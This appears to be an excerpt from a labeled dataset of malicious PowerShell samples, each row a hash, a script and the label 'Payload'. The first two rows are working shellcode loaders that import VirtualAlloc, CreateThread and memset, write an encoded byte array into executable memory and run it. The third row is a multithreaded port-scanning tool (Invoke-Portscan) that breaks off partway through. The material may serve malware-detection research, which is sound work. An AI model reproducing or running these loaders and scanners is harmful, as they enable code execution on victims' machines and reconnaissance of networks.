be,0x81,0x6c,0x4c,0x9d,0xcd,0x41,0x7d,0x1e,0x0e,0xcd,0xf6,0x6d,0x3c,0x52,0xad,0xf9,0x0c,0x1b,0x6b,0xfd,0x73,0x36,0xcb,0x91,0x8d,0xb8,0x2c,0xbb,0x49,0xec,0x7c,0xd3,0x78,0x8c,0x16,0x23,0x84,0x59,0xb8,0x73,0x2a,0x31,0x79,0x24,0x8a,0xe1,0x11,0x2e,0x05,0xde,0x02,0x51,0xcf,0x77,0x2a,0xa0,0xf0,0x77,0xab,0x8c,0xc9,0x45,0x85,0xdf,0x1f,0x91,0xf7,0x27,0x4e,0xd0,0x37,0x69,0x8e,0x7a,0x91,0xa1,0xba,0xfa,0x1e,0x64,0x49,0xba,0xfc,0xed,0x4b,0x6a,0x95,0xf3,0x53,0x9b,0x39,0x7d,0xb5,0xf1,0xd1,0x2b,0x6d,0x6d,0x4b,0x76,0xe5,0x0c,0x94,0xac,0x83,0x0e,0x1e,0x43,0x73,0xc0,0xd7,0x2e,0x67,0xb4,0x17,0x65,0xd5,0x12,0x27,0x53,0x70,0x9a,0xbd,0x58,0xd3,0xcd,0x29,0x63,0x02,0x39,0xf6,0x9c,0x61,0x32,0x3f,0x09,0xca,0x2c,0x40,0xdd,0xca,0xac,0x16,0xb7,0xca,0xc4,0xce,0xe3,0x98,0xf1,0x10,0x3e,0x8d,0xaa,0x84,0xc1,0xe4,0x1f,0x0e,0xaa,0x0a,0x46,0x78,0x75,0xf4,0xad,0x78,0x49,0x23,0x8b,0x0e,0xa3,0xf7;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$2kQz=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($2kQz.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$2kQz,0,0,0);for (;;){Start-sleep 60};

",Payload
5f73996b976e1f027d26505078a50a0bb1fe70091ca95f134059fba46ab544e9,"
$R0E3 = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $R0E3 -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xd7,0xba,0x23,0x95,0x04,0xe9,0xd9,0x74,0x24,0xf4,0x5e,0x31,0xc9,0xb1,0x53,0x31,0x56,0x17,0x83,0xee,0xfc,0x03,0x75,0x86,0xe6,0x1c,0x85,0x40,0x64,0xde,0x75,0x91,0x09,0x56,0x90,0xa0,0x09,0x0c,0xd1,0x93,0xb9,0x46,0xb7,0x1f,0x31,0x0a,0x23,0xab,0x37,0x83,0x44,0x1c,0xfd,0xf5,0x6b,0x9d,0xae,0xc6,0xea,0x1d,0xad,0x1a,0xcc,0x1c,0x7e,0x6f,0x0d,0x58,0x63,0x82,0x5f,0x31,0xef,0x31,0x4f,0x36,0xa5,0x89,0xe4,0x04,0x2b,0x8a,0x19,0xdc,0x4a,0xbb,0x8c,0x56,0x15,0x1b,0x2f,0xba,0x2d,0x12,0x37,0xdf,0x08,0xec,0xcc,0x2b,0xe6,0xef,0x04,0x62,0x07,0x43,0x69,0x4a,0xfa,0x9d,0xae,0x6d,0xe5,0xeb,0xc6,0x8d,0x98,0xeb,0x1d,0xef,0x46,0x79,0x85,0x57,0x0c,0xd9,0x61,0x69,0xc1,0xbc,0xe2,0x65,0xae,0xcb,0xac,0x69,0x31,0x1f,0xc7,0x96,0xba,0x9e,0x07,0x1f,0xf8,0x84,0x83,0x7b,0x5a,0xa4,0x92,0x21,0x0d,0xd9,0xc4,0x89,0xf2,0x7f,0x8f,0x24,0xe6,0x0d,0xd2,0x20,0xcb,0x3f,0xec,0xb0,0x43,0x37,0x9f,0x82,0xcc,0xe3,0x37,0xaf,0x85,0x2d,0xc0,0xd0,0xbf,0x8a,0x5e,0x2f,0x40,0xeb,0x77,0xf4,0x14,0xbb,0xef,0xdd,0x14,0x50,0xef,0xe2,0xc0,0xcd,0xe7,0x45,0xbb,0xf3,0x0a,0x35,0x6b,0xb4,0xa4,0xde,0x61,0x3b,0x9b,0xff,0x89,0x91,0xb4,0x68,0x74,0x1a,0xab,0x34,0xf1,0xfc,0xa1,0xd4,0x57,0x56,0x5d,0x17,0x8c,0x6f,0xfa,0x68,0xe6,0xc7,0x6c,0x20,0xe0,0xd0,0x93,0xb1,0x26,0x77,0x03,0x3a,0x25,0x43,0x32,0x3d,0x60,0xe3,0x23,0xaa,0xfe,0x62,0x06,0x4a,0xfe,0xae,0xf0,0xef,0x6d,0x35,0x00,0x79,0x8e,0xe2,0x57,0x2e,0x60,0xfb,0x3d,0xc2,0xdb,0x55,0x23,0x1f,0xbd,0x9e,0xe7,0xc4,0x7e,0x20,0xe6,0x89,0x3b,0x06,0xf8,0x57,0xc3,0x02,0xac,0x07,0x92,0xdc,0x1a,0xee,0x4c,0xaf,0xf4,0xb8,0x23,0x79,0x90,0x3d,0x08,0xba,0xe6,0x41,0x45,0x4c,0x06,0xf3,0x30,0x09,0x39,0x3c,0xd5,0x9d,0x42,0x20,0x45,0x61,0x99,0xe0,0x75,0x28,0x83,0x41,0x1e,0xf5,0x56,0xd0,0x43,0x06,0x8d,0x17,0x7a,0x85,0x27,0xe8,0x79,0x95,0x42,0xed,0xc6,0x11,0xbf,0x9f,0x57,0xf4,0xbf,0x0c,0x57,0xdd;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$D4F4=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($D4F4.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$D4F4,0,0,0);for (;;){Start-sleep 60};

",Payload
ae98abb6b09e667d2b640a6720f3ce5eff97f9640c7900cb1d9022c97d97b540,"function Invoke-Portscan
{


    [CmdletBinding()]Param (
        
        [Parameter(ParameterSetName=""cmdHosts"",

                   ValueFromPipeline=$True,
                   Mandatory = $True)]
                   [String[]] $Hosts,

        [Parameter(ParameterSetName=""fHosts"",
                   Mandatory = $True)]
                   [Alias(""iL"")]
                   [String]  $HostFile,

        [Parameter(Mandatory = $False)]
                   [Alias(""exclude"")]
                   [String] $ExcludeHosts,

        [Parameter(Mandatory = $False)]
                   [Alias(""p"")]
                   [String] $Ports,

        [Parameter(Mandatory = $False)]
                   [Alias(""iP"")]
                   [String] $PortFile,

        [Parameter(Mandatory = $False)]
                   [String] $TopPorts,

        [Parameter(Mandatory = $False)]
                   [Alias(""xPorts"")]
                   [String] $ExcludedPorts,

        [Parameter(Mandatory = $False)]
                   [Switch] $Open,

        
        [Parameter(Mandatory = $False)]
                   [Alias(""Pn"")]
                   [Switch] $SkipDiscovery,

        [Parameter(Mandatory = $False)]
                   [Alias(""sn"")]
                   [Switch] $PingOnly,

        [Parameter(Mandatory = $False)]
                   [Alias(""PS"")]
                   [string] $DiscoveryPorts = ""-1,445,80,443"",

        
        [Parameter(Mandatory = $False)]
                   [int] $Threads = 100,

        [Parameter(Mandatory = $False)]
                   [int] $nHosts = 25,

        [Parameter(Mandatory = $False)]
                   [int] $Timeout = 2000,

        [Parameter(Mandatory = $False)]
                   [int] $SleepTimer = 500,

        [Parameter(Mandatory = $False)]
                   [int] $SyncFreq = 1024,

        [Parameter(Mandatory = $False)]
                   [int] $T,

        
        [Parameter(Mandatory = $False)]
                   [Alias(""oG"")]
                   [String] $GrepOut,

        [Parameter(Mandatory = $False)]
                   [Alias(""oX"")]
                   [String] $XmlOut,

        [Parameter(Mandatory = $False)]
                   [Alias(""oN"")]
                   [String] $ReadableOut,

        [Parameter(Mandatory = $False)]
                   [Alias(""oA"")]
                   [String] $AllformatsOut,

        [Parameter(Mandatory = $False)]
                   [Switch] $noProgressMeter,

        [Parameter(Mandatory = $False)]
                   [Alias(""q"")]
                   [Switch] $quiet,

        [Parameter(Mandatory = $False)]
                   [Alias(""F"")]
                   [Switch] $ForceOverwrite

        
        
    )

    PROCESS {

        Set-StrictMode -Version 2.0

        $version = .13
        $hostList = New-Object System.Collections.ArrayList
        $portList = New-Object System.Collections.ArrayList
        $hostPortList = New-Object System.Collections.ArrayList

        $scannedHostList = @()

        function Parse-Hosts
        {
            Param (
                [Parameter(Mandatory = $True)] [String] $Hosts
            )

            [String[]] $iHosts = $Hosts.Split("","")

            foreach($iHost in $iHosts)
            {
                $iHost = $iHost.Replace("" "", """")

                if(!$iHost)
                {
                    continue
                }

                if($iHost.contains(""/""))
                {
                    $netPart = $iHost.split(""/"")[0]
                    [uint32]$maskPart = $iHost.split(""/"")[1]

                    $address = [System.Net.IPAddress]::Parse($netPart)

                    if ($maskPart -ge $address.GetAddressBytes().Length * 8)
                    {
                        throw ""Bad host mask""
                    }

                    $numhosts = [System.math]::Pow(2,(($address.GetAddressBytes().Length *8) - $maskPart))

                    $startaddress = $address.GetAddressBytes()
                    [array]::Reverse($startaddress)

                    $startaddress = [System.BitConverter]::ToUInt32($startaddress, 0)
                    [uint32]$startMask = ([System.math]::Pow(2, $maskPart)-1) * ([System.Math]::Pow(2,(32 - $maskPart)))
                    $startAddress = $startAddress -band $startMask

                    
                    $startAddress = [System.BitConverter]::GetBytes($startaddress)[0..3]
                    [array]::Reverse($startaddress)

                    $address = [System.Net.IPAddress] [byte[]] $startAddress

                    $hostList.Add($address.IPAddressToString)

                    for ($i=0; $i -lt $numhosts-1; $i++)
                    {

                        $nextAddress =  $address.GetAddressBytes()
                        [array]::Reverse($nextAddress)
                        $nextAddress =  [System.BitConverter]::ToUInt32($nextAddress, 0)
                        $nextAddress ++
                        $nextAddress = [System.BitConverter]::GetBytes($nextAddress)[0..3]
                        [array]::Reverse($nextAddress)

                        $address = [System.Net.IPAddress] [byte[]] $nextAddress
                        $hostList.Add($address.IPAddressToString)

                    }

                }
                else
                {
                    $hostList.Add($iHost)
                }
            }
        }

        function Parse-ILHosts
        {
           Param (
                [Parameter(Mandatory = $True)] [String] $HostFile
            )

            Get-Content $HostFile | ForEach-Object {
                Parse-Hosts $_
            }
        }

        function Exclude-Hosts
        {
            Param (
                [Parameter(Mandatory = $True)] [String] $excludeHosts
            )

            [String[]] $iHosts = $excludeHosts.Split("","")

            foreach($iHost in $iHosts)
            {
                $iHost = $iHost.Replace("" "", """")
                $hostList.Remove($iHost)
            }
        }

        function Get-TopPort
        {
            Param (
                [Parameter(Mandatory = $True)]
                [ValidateRange(1,1000)]
                [int] $numPorts
            )

            
            [int[]] $topPortList = @(80,23,443,21,3389,110,445,139,143,53,135,3306,8080,22
                        1723,111,995,993,5900,1025,1720,548,113,81,6001,179,1026,2000,8443,
                        8000,32768,554,26,1433,49152,2001,515,8008,49154,1027,5666,646,5000,
                        5631,631,49153,8081,2049,88,79,5800,106,2121,1110,49155,6000,513,
                        990,5357,49156,543,544,5101,144,7,389,8009,9999,5009,7070,5190,3000,
                        5432,1900,3986,13,1029,9,5051,6646,49157,1028,873,1755,2717,4899,9100,
                        119,37,1000,3001,5001,82,10010,1030,9090,2107,1024,2103,6004,1801,
                        5050,19,8031,1041,255,1048,1049,1053,1054,1056,1064,3703,17,808,3689,
                        1031,1044,1071,5901,100,9102,2869,4001,5120,8010,9000,2105,636,1038,
                        2601,1,7000,1066,1069,625,311,280,254,4000,1761,5003,2002,1998,2005,
                        1032,1050,6112,1521,2161,6002,2401,902,4045,787,7937,1058,2383,1033,
                        1040,1059,50000,5555,1494,3,593,2301,3268,7938,1022,1234,1035,1036,1037,
                        1074,8002,9001,464,497,1935,2003,6666,6543,24,1352,3269,1111,407,500,
                        20,2006,1034,1218,3260,15000,4444,264,33,2004,1042,42510,999,3052,1023,
                        222,1068,888,7100,1717,992,2008,7001,2007,8082,512,1043,2009,5801,1700,
                        7019,50001,4662,2065,42,2602,3333,9535,5100,2604,4002,5002,1047,1051,1052,
                        1055,1060,1062,1311,3283,4443,5225,5226,6059,6789,8089,8651,8652,8701,9415,
                        9593,9594,9595,16992,16993,20828,23502,32769,33354,35500,52869,55555,55600,
                        64623,64680,65000,65389,1067,13782,366,5902,9050,85,1002,5500,1863,1864,
                        5431,8085,10243,45100,49999,51103,49,90,6667,1503,6881,27000,340,1500,8021,
                        2222,5566,8088,8899,9071,5102,6005,9101,163,5679,146,648,1666,83,3476,5004,
                        5214,8001,8083,8084,9207,14238,30,912,12345,2030,2605,6,541,4,1248,3005,8007,
                        306,880,2500,1086,1088,2525,4242,8291,9009,52822,900,6101,2809,7200,211,800,
                        987,1083,12000,705,711,20005,6969,13783,1045,1046,1061,1063,1070,1072,1073,
                        1075,1077,1078,1079,1081,1082,1085,1093,1094,1096,1098,1099,1100,1104,1106,
                        1107,1108,1148,1169,1272,1310,1687,1718,1783,1840,2100,2119,2135,2144,2160,
                        2190,2260,2381,2399,2492,2607,2718,2811,2875,3017,3031,3071,3211,3300,3301,
                        3323,3325,3351,3404,3551,3580,3659,3766,3784,3801,3827,3998,4003,4126,4129,
                        4449,5222,5269,5633,5718,5810,5825,5877,5910,5911,5925,5959,5960,5961,5962,
                        5987,5988,5989,6123,6129,6156,6389,6580,6901,7106,7625,7777,7778,7911,8086,
                        8181,8222,8333,8400,8402,8600,8649,8873,8994,9002,9011,9080,9220,9290,9485,
                        9500,9502,9503,9618,9900,9968,10002,10012,10024,10025,10566,10616,10617,10621,
                        10626,10628,10629,11110,13456,14442,15002,15003,15660,16001,16016,16018,17988,
                        19101,19801,19842,20000,20031,20221,20222,21571,22939,24800,25734,27715,28201,
                        30000,30718,31038,32781,32782,33899,34571,34572,34573,40193,48080,49158,49159,
                        49160,50003,50006,50800,57294,58080,60020,63331,65129,691,212,1001,1999,2020,
                        2998,6003,7002,50002,32,2033,3372,99,425,749,5903,43,458,5405,6106,6502,7007,
                        13722,1087,1089,1124,1152,1183,1186,1247,1296,1334,1580,1782,2126,2179,2191,2251,
                        2522,3011,3030,3077,3261,3493,3546,3737,3828,3871,3880,3918,3995,4006,4111,4446,
                        5054,5200,5280,5298,5822,5859,5904,5915,5922,5963,7103,7402,7435,7443,7512,8011,
                        8090,8100,8180,8254,8500,8654,9091,9110,9666,9877,9943,9944,9998,10004,10778,15742,
                        16012,18988,19283,19315,19780,24444,27352,27353,27355,32784,49163,49165,49175,
                        50389,50636,51493,55055,56738,61532,61900,62078,1021,9040,666,700,84,545,1112,
                        1524,2040,4321,5802,38292,49400,1084,1600,2048,2111,3006,6547,6699,9111,16080,
                        555,667,720,801,1443,1533,2106,5560,6007,1090,1091,1114,1117,1119,1122,1131,1138,
                        1151,1175,1199,1201,1271,1862,2323,2393,2394,2608,2725,2909,3003,3168,3221,3322,
                        3324,3390,3517,3527,3800,3809,3814,3826,3869,3878,3889,3905,3914,3920,3945,3971,
                        4004,4005,4279,4445,4550,4567,4848,4900,5033,5080,5087,5221,5440,5544,5678,5730,
                        5811,5815,5850,5862,5906,5907,5950,5952,6025,6510,6565,6567,6689,6692,6779,6792,
                        6839,7025,7496,7676,7800,7920,7921,7999,8022,8042,8045,8093,8099,8200,8290,8292,
                        8300,8383,9003,9081,9099,9200,9418,9575,9878,9898,9917,10003,10180,10215,11111,
                        12174,12265,14441,15004,16000,16113,17877,18040,18101,19350,25735,26214,27356,
                        30951,32783,32785,40911,41511,44176,44501,49161,49167,49176,50300,50500,52673,
                        52848,54045,54328,55056,56737,57797,60443,70,417,714,722,777,981,1009,2022,4224,
                        4998,6346,301,524,668,765,2041,5999,10082,259,1007,1417,1434,1984,2038,2068,4343,
                        6009,7004,44443,109,687,726,911,1461,2035,4125,6006,7201,9103,125,481,683,903,
                        1011,1455,2013,2043,2047,6668,6669,256,406,843,2042,2045,5998,9929,31337,44442,
                        1092,1095,1102,1105,1113,1121,1123,1126,1130,1132,1137,1141,1145,1147,1149,1154,
                        1164,1165,1166,1174,1185,1187,1192,1198,1213,1216,1217,1233,1236,1244,1259,1277,
                        1287,1300,1301,1309,1322,1328,1556,1641,1688,1719,1721,1805,1812,1839,1875,1914,
                        1971,1972,1974,2099,2170,2196,2200,2288,2366,2382,2557,2800,2910,2920,2968,3007,
                        3013,3050,3119,3304,3307,3376,3400,3410,3514,3684,3697,3700,3824,3846,3848,3859,
                        3863,3870,3872,3888,3907,3916,3931,3941,3957,3963,3968,3969,3972,3990,3993,3994,
                        4009,4040,4080,4096,4143,4147,4200,4252,4430,4555,4600,4658,4875,4949,5040,5063,
                        5074,5151,5212,5223,5242,5279,5339,5353,5501,5807,5812,5818,5823,5868,5869,5899,
                        5905,5909,5914,5918,5938,5940,5968,5981,6051,6060,6068,6203,6247,6500,6504,6520,
                        6550,6600)
            $numPorts--
            $portList.AddRange($topPortList[0..$numPorts])
        }

        function Parse-Ports
        {
            Param (
                [Parameter(Mandatory = $True)] [String] $Ports,
                [Parameter(Mandatory = $True)] $pList
            )

            foreach ($pRange in $Ports.Split("",""))
            {

                
                if ($pRange -eq ""-1"")
                {
                    $pList.Add([int]$pRange)
                }
                elseif ($pRange.Contains(""-""))
                {
                    [int[]] $range = $pRange.Split(""-"")
                    if ($range.Count -ne 2 -or $pRange.Split(""-"")[0] -eq """" -or $pRange.split(""-"")[1] -eq """")
                    {
                        throw ""Invalid port range""
                    }

                    $pList.AddRange($range[0]..$range[1])
                }
                else
                {
                    $pList.Add([int]$pRange)
                }

            }
            foreach ($p in $pList)
            {
                if ($p -lt -1 -or $p -gt 65535)
                {
                    throw ""Port $p out of range""
                }
            }
         }

        function Parse-IpPorts
        {
           Param (
                [Parameter(Mandatory = $True)] [String] $PortFile
            )

            Get-Content $PortFile | ForEach-Object {
                Parse-Ports -Ports $_ -pList $portList
            }
        }

        function Remove-Ports
        {
            Param (
                [Parameter(Mandatory = $True)] [string] $ExcludedPorts
            )

            [int[]] $ExcludedPorts = $ExcludedPorts.Split("","")

            foreach ($x in $ExcludedPorts)
            {
                $portList.Remove($x)
            }
        }

        function Write-PortscanOut
        {
            Param (
                [Parameter(Mandatory = $True, ParameterSetName=""Comment"")] [string] $comment,
                [Parameter(Mandatory = $True, ParameterSetName=""HostOut"")] [string] $outhost,
                [Parameter(Mandatory = $True, ParameterSetName=""HostOut"")] [bool] $isUp,
                [Parameter(Mandatory = $True, ParameterSetName=""HostOut"")] $openPorts,
                [Parameter(Mandatory = $True, ParameterSetName=""HostOut"")] $closedPorts,
                [Parameter(Mandatory = $True, ParameterSetName=""HostOut"")] $filteredPorts,
                [Parameter()] [bool] $SkipDiscovery,
                [Parameter()] [System.IO.StreamWriter] $grepStream,
                [Parameter()] [System.Xml.XmlWriter] $xmlStream,
                [Parameter()] [System.IO.StreamWriter] $readableStream

            )
            switch ($PSCmdlet.ParameterSetName)
            {
                ""Comment""
                {

                    Write-Verbose $comment

                    if ($grepStream) {
                        $grepStream.WriteLine(""
                    }
                    if ($xmlStream) {
                        $xmlStream.WriteComment($comment)
                    }
                    if ($readableStream) {
                        $readableStream.WriteLine($comment)
                    }
                }
                ""HostOut""
                {
                    $oPort = [string]::join("","", $openPorts.ToArray())
                    $cPort = [string]::join("","", $closedPorts.ToArray())
                    $fPort = [string]::join("","", $filteredPorts.ToArray())

                    if ($grepStream) {
                       
                       if ($isUp -and !$SkipDiscovery) {
                            $grepStream.writeline(""Host: $outhost`tStatus: Up"")
                        }
                        if ($isUp -or $SkipDiscovery) {
                            if ($oPort -ne """") {
                                $grepStream.writeline(""Host: $outhost`tOpen Ports: $oPort"")
                            }
                            if ($cPort -ne """") {
                                $grepStream.writeline(""Host: $outhost`tClosed Ports: $cPort"")
                            }
                            if ($fPort -ne """") {
                                $grepStream.writeline(""Host: $outhost`tFiltered Ports: $fPort"")
                            }
                        }
                        elseif (!$SkipDiscovery) {
                            $grepStream.writeline(""Host: $outhost`tStatus: Down"")
                        }
                    }
                    if ($xmlStream) {
                        $xmlStream.WriteStartElement(""Host"")

                        $xmlStream.WriteAttributeString(""id"", $outhost)
                        if (!$SkipDiscovery) {
                            if ($isUp) {
                                $xmlStream.WriteAttributeString(""Status"", ""Up"")
                             }
                             else {
                                $xmlStream.WriteAttributeString(""Status"", ""Downs"")
                             }
                        }

                        $xmlStream.WriteStartElement(""Ports"")
                        foreach($p in $openPorts) {
                            $xmlStream.writestartElement(""Port"")
                            $xmlStream.WriteAttributeString(""id"", [string]$p)
                            $xmlStream.WriteAttributeString(""state"", ""open"")
                            $xmlStream.WriteEndElement()

                        }
                        foreach ($p in $closedPorts) {
                            $xmlStream.writestartElement(""Port"")
                            $xmlStream.WriteAttributeString(""id"", [string]$p)
                            $xmlStream.WriteAttributeString(""state"", ""closed"")
                            $xmlStream.WriteEndElement()
                        }
                        foreach ($p in $filteredPorts) {
                            $xmlStream.writestartElement(""Port"")
                            $xmlStream.WriteAttributeString(""id"", [string]$p)
                            $xmlStream.WriteAttributeString(""state"", ""filtered"")
                            $xmlStream.WriteEndElement()
                        }

                        $xmlStream.WriteEndElement()
                        $xmlStream.WriteEndElement()
                    }
                    if ($readableStream) {
                        $readableStream.writeline(""Porscan.ps1 scan report for $outhost"")
                        if ($isUp) {
                            $readableStream.writeline(""Host is up"")
                        }

                        if ($isUp -or $SkipDiscovery) {

                            $readableStream.writeline((""{0,-10}{1,0}"" -f ""PORT"", ""STATE""))

                            [int[]]$allports = $openPorts + $closedPorts + $filteredPorts
                            foreach($p in ($allports| Sort-Object))
                            {
                                if ($openPorts.Contains($p)) {
                                    $readableStream.writeline((""{0,-10}{1,0}"" -f $p, ""open""))
                                }
                                elseif ($closedPorts.Contains($p)) {
                                    $readableStream.writeline((""{0,-10}{1,0}"" -f $p, ""closed""))
                                }
                                elseif ($filteredPorts.Contains($p)) {
                                    $readableStream.writeline((""{0,-10}{1,0}"" -f $p, ""filtered""))
                                }
                            }

                        }
                        elseif(!$SkipDiscovery) {
                            $readableStream.writeline(""Host is Down"")
                        }
                        $readableStream.writeline("""")
                    }
                }
            }
        }

        
        function Convert-SwitchtoBool
        {
            Param (
                [Parameter(Mandatory = $True)] $switchValue
            )
            If ($switchValue) {
                return $True
            }
            return $False
        }

        try
        {

            [bool] $SkipDiscovery = Convert-SwitchtoBool ($SkipDiscovery)
            [bool] $PingOnly = Convert-SwitchtoBool ($PingOnly)
            [bool] $quiet  = Convert-SwitchtoBool ($quiet)
            [bool] $ForceOverwrite  = Convert-SwitchtoBool ($ForceOverwrite)

            
            
            

            [Environment]::CurrentDirectory=(Get-Location -PSProvider FileSystem).ProviderPath

            if ($PsCmdlet.ParameterSetName -eq ""cmdHosts"")
            {
                foreach($h in $Hosts)
                {
                    Parse-Hosts($h) | Out-Null
                }
            }
            else
            {
                Parse-ILHosts($HostFile) | Out-Null
            }
            if($ExcludeHosts)
            {
                Exclude-Hosts($ExcludeHosts)
            }
            if (($TopPorts -and $Ports) -or ($TopPorts -and $PortFile))
            {
                throw ""Cannot set topPorts with other specific ports""
            }
            if($Ports)
            {
                Parse-Ports -Ports $Ports -pList $portList | Out-Null
            }
            if($PortFile)
            {
                Parse-IpPorts($PortFile) | Out-Null
            }
            if($portList.Count -eq 0)
            {
                if ($TopPorts)
                {
                    Get-TopPort($TopPorts) | Out-Null
                }
                else
                {
                    
                    Get-TopPort(50) | Out-Null
                }
            }
            if ($ExcludedPorts)
            {
                Remove-Ports -ExcludedPorts $ExcludedPorts | Out-Null
            }

            if($T)
            {
                switch ($T)
                {
                    5 {$nHosts=30;  $Threads = 1000; $Timeout = 750 }
                    4 {$nHosts=25;  $Threads = 1000; $Timeout = 1200 }
                    3 {$nHosts=20;  $Threads = 100;  $Timeout = 2500 }
                    2 {$nHosts=15;  $Threads = 32;   $Timeout = 3000 }
                    1 {$nHosts=10;  $Threads = 32;   $Timeout = 5000 }
                    default {
                        throw ""Invalid T parameter""
                    }
                }
            }

            $grepStream = $null
            $xmlStream = $null
            $readableStream = $null

            if($AllformatsOut)
            {
                if ($GrepOut -or $XmlOut -or $ReadableOut) {
                     Write-Warning ""Both -oA specified with other output... going to ignore -oG/-oN/-oX""
                }
                $GrepOut = $AllformatsOut + "".gnmap""
                $XmlOut = $AllformatsOut + "".xml""
                $ReadableOut = $AllformatsOut + "".nmap""
            }
            if ($GrepOut) {
                if (!$ForceOverwrite -and (Test-Path $GrepOut)) {
                    throw ""Error: $AllformatsOut already exists. Either delete the file or specify the -f flag""
                }
                $grepStream = [System.IO.StreamWriter] $GrepOut
            }
            if ($ReadableOut) {
                if (!$ForceOverwrite -and (Test-Path $ReadableOut)) {
                    throw ""Error: $ReadableOut already exists. Either delete the file or specify the -f flag""
                }
                $readableStream = [System.IO.StreamWriter] $ReadableOut
            }
            if ($XmlOut) {
                if (!$ForceOverwrite -and (Test-Path $XmlOut)) {
                    throw ""Error: $XmlOut already exists. Either delete the file or specify the -f flag""
                }

                $xmlStream =   [System.xml.xmlwriter]::Create([string]$XmlOut)
                $xmlStream.WriteStartDocument()
                $xmlStream.WriteStartElement(""Portscanrun"")
                $xmlStream.WriteAttributeString(""version"", $version)

            }

            Parse-Ports -Ports $DiscoveryPorts -pList $hostPortList | Out-Null

            $startdate = Get-Date
            $myInvocationLine = $PSCmdlet.MyInvocation.Line
            $startMsg = ""Invoke-Portscan.ps1 v$version scan initiated $startdate as: $myInvocationLine""

            
            Write-PortscanOut -comment $startMsg -grepStream $grepStream -xmlStream $xmlStream -readableStream $readableStream

            
            $sPortList = [string]::join("","", $portList)
            $sHostPortList = [string]::join("","", $hostPortList)

            
            
            
            $portScanCode = {
                param (
                    [Parameter( Mandatory = $True)] [string] $thost,
                    [Parameter( Mandatory = $True)][bool] $SkipDiscovery,
                    [Parameter( Mandatory = $True)][bool] $PingOnly,
                    [Parameter( Mandatory = $True)][int] $Timeout,
                    [Parameter( Mandatory = $True)] $PortList,
                    [Parameter( Mandatory = $True)] $hostPortList,
                    [Parameter( Mandatory = $True)][int] $maxthreads)
                Process
                {
                $openPorts = New-Object System.Collections.ArrayList
                $closedPorts = New-Object System.Collections.ArrayList
                $filteredPorts = New-Object System.Collections.ArrayList

                $sockets = @{}
                $timeouts = New-Object Hashtable

                
                $fThreads = New-Object int
                $aThreads = New-Object int
                [System.Threading.ThreadPool]::GetMaxThreads([ref]$fThreads, [ref]$aThreads) | Out-Null
                [System.Threading.ThreadPool]::SetMaxThreads($fthreads,$maxthreads) | Out-Null

                function New-ScriptBlockCallback {
                    param(
                        [parameter(Mandatory=$true)]
                        [ValidateNotNullOrEmpty()]
                        [scriptblock]$Callback
                    )

                    
                    if (-not (""CallbackEventBridge"" -as [type])) {
                        Add-Type @""
                            using System;

                            public sealed class CallbackEventBridge
                            {
                                public event AsyncCallback CallbackComplete = delegate { };

                                private CallbackEventBridge() {}

                                private void CallbackInternal(IAsyncResult result)
                                {
                                    CallbackComplete(result);
                                }

                                public AsyncCallback Callback
                                {
                                    get { return new AsyncCallback(CallbackInternal); }
                                }

                                public static CallbackEventBridge Create()
                                {
                                    return new CallbackEventBridge();
                                }
                            }
""@
                    }

                    $bridge = [CallbackEventBridge]::Create()
                    Register-ObjectEvent -InputObject $bridge -EventName CallbackComplete -Action $Callback | Out-Null

                    $bridge.Callback

                }

                function Test-Port {

                    Param (
                        [Parameter(Mandatory = $True)] [String] $h,
                        [Parameter(Mandatory = $True)] [int] $p,
                        [Parameter(Mandatory = $True)] [int] $timeout
                    )

                    try {
                        $pAddress = [System.Net.IPAddress]::Parse($h)
                        $sockets[$p] = new-object System.Net.Sockets.TcpClient $pAddress.AddressFamily

                    }
                    catch {
                        
                        $sockets[$p] = new-object System.Net.Sockets.TcpClient
                    }

                    
                    $scriptBlockAsString = @""

                        
                        if ( `$sockets[$p] -ne `$NULL)
                        {
                            if (!`$timeouts[$p].Disposed) {
                                `$timeouts[$p].Dispose()
                            }

                            `$status = `$sockets[$p].Connected;
                            if (`$status -eq `$True)
                            {
                                
                                `$openPorts.Add($p)
                            }
                            else
                            {
                                
                                `$closedPorts.Add($p)

                            }
                            `$sockets[$p].Close();

                            `$sockets.Remove($p)
                        }
""@
                    $timeoutCallback = @""
                        
                        `$sockets[$p].Close()
                        if (!`$timeouts[$p].Disposed) {
                            `$timeouts[$p].Dispose()
                            `$filteredPorts.Add($p)
                        }
                        `$sockets.Remove($p)
""@

                    $timeoutCallback = [scriptblock]::Create($timeoutCallback)

                    $timeouts[$p] = New-Object System.Timers.Timer
                    Register-ObjectEvent -InputObject $timeouts[$p] -EventName Elapsed -Action $timeoutCallback | Out-Null
                    $timeouts[$p].Interval = $timeout
                    $timeouts[$p].Enabled = $true

                    $myscriptblock = [scriptblock]::Create($scriptBlockAsString)
                    $x = $sockets[$p].beginConnect($h, $p,(New-ScriptBlockCallback($myscriptblock)) , $null)

                }

                function PortScan-Alive
                {
                    Param (
                        [Parameter(Mandatory = $True)] [String] $h
                    )

                    Try
                    {

                        
                        if ($hostPortList.Contains(-1))
                        {
                            $ping = new-object System.Net.NetworkInformation.Ping
                            $pResult = $ping.send($h)
                            if ($pResult.Status -eq ""Success"")
                            {
                                return $True
                            }
                        }
                        foreach($Port in $hostPortList)
                        {
                            if ($Port -ne -1)
                            {
                                Test-Port -h $h -p $Port -timeout $Timeout
                            }
                        }

                        do {
                            Start-Sleep -Milli 100
                            if (($openPorts.Count -gt 0) -or ($closedPorts.Count -gt 0)) {
                                return $True
                            }
                        }
                        While ($sockets.Count -gt 0)

                    }
                    Catch
                    {
                        Write-Error ""Exception trying to host scan $h""
                        Write-Error $_.Exception.Message;
                    }

                    return $False
                }

